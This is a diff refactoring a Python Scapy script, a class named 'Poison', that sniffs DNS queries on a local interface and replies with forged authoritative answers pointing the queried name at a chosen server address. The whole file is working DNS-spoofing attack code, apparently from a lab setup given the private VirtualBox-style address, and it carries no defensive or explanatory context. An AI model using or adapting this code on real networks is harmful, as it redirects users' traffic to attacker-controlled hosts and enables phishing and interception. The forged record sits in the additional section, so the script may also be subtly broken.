@@ -1,44 +1,51 @@
 #! /usr/bin/python
 
-from scapy.all import *
-# from scapy.layers.l2 import Ether, ARP
-import sys
-
+from scapy import packet
+from scapy.arch import get_if_hwaddr
+from scapy.layers.dns import DNSRR, DNSQR, DNS
+from scapy.layers.inet import IP, UDP
+from scapy.layers.l2 import Ether
+from scapy.sendrecv import sendp, sniff
 
 
 class Poison: 
+    
+    interface = ' '
+    server = ' '
 
-    interface = "enp0s3"
-    ServerIP = "192.168.56.102"
-    packet_filter = " and ".join([
-        "udp dst port 53",          # Filter UDP port 53
-        "udp[10] & 0x80 = 0",       # DNS queries only
+    def __init__(self, interface, server, websites):
+        self.interface = interface
+        self.server = server
+        self.websites = websites
+        self.packet_filter = " and ".join([
+            "udp dst port 53",      # Filter UDP port 53
+            "udp[10] & 0x80 = 0",   # DNS queries only
         ])
 
-    def reply(self,pkt):
+    def reply(self, packet):
         # Construct the DNS packet
         # Construct the Ethernet header by looking at the sniffed packet
         eth = Ether(
-            src=pkt[Ether].dst,
-            dst=pkt[Ether].src
+            src=packet[Ether].dst,
+            dst=packet[Ether].src
             )
 
         # Construct the IP header by looking at the sniffed packet
         ip = IP(
-            src=pkt[IP].dst,
-            dst=pkt[IP].src
+            src=packet[IP].dst,
+            dst=packet[IP].src
             )
 
         # Construct the UDP header by looking at the sniffed packet
         udp = UDP(
-            dport=pkt[UDP].sport,
-            sport=pkt[UDP].dport
+            dport=packet[UDP].sport,
+            sport=packet[UDP].dport
             )
 
         # Construct the DNS response by looking at the sniffed packet and manually
         dns = DNS(
-            id=pkt[DNS].id,
-            qd=pkt[DNS].qd,
+            id=packet[DNS].id,
+            qd=packet[DNS].qd,
             aa=1,
             rd=0,
             qr=1,
@@ -47,10 +54,10 @@ class Poison:
             nscount=0,
             arcount=0,
             ar=DNSRR(
-                rrname=pkt[DNS].qd.qname,
+                rrname=packet[DNS].qd.qname,
                 type='A',
                 ttl=600,
-                rdata=self.ServerIP)
+                rdata=self.server)
             )
 
         # Put the full packet together
@@ -60,7 +67,7 @@ class Poison:
         sendp(response_packet, iface=self.interface)
 
     def sniff(self):
-        return sniff(prn=self.dns_reply, filter=self.packet_filter, store=0, iface = self.interface, count = 1)
+        return sniff(prn=self.reply, filter=self.packet_filter, store=0, iface = self.interface, count = 1)
 
         
 		
